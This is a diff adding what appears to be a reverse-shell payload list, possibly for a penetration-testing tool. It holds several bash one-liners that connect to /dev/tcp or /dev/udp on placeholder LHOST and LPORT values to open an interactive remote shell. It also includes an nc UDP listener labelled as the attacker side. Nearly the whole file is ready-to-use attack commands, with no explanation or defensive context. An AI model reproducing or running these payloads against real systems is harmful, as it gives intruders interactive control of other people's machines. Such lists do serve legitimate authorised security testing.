@@ -1,0 +1,18 @@
+/bin/bash -c '/bin/bash -i >& /dev/tcp/#{LHOST}/#{LPORT} 0>&1'
+
+/bin/bash -c '/bin/bash -i > /dev/tcp/#{LHOST}/#{LPORT} 0<&1 2>&1'
+
+/bin/bash -i > /dev/tcp/#{LHOST}/#{LPORT} 0<& 2>&1
+
+bash -i >& /dev/tcp/#{LHOST}/#{LPORT} 0>&1
+
+exec 5<>/dev/tcp/#{LHOST}/#{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done
+
+exec /bin/sh 0</dev/tcp/#{LHOST}/#{LPORT} 1>&0 2>&0
+
+0<&196;exec 196<>/dev/tcp/#{LHOST}/#{LPORT}; sh <&196 >&196 2>&196
+
+UDP bash -i >& /dev/udp/#{LHOST}/#{LPORT} 0>&1
+
+nc -u -lvp #{LPORT}
+# desc:UDP Listener (attacker) 
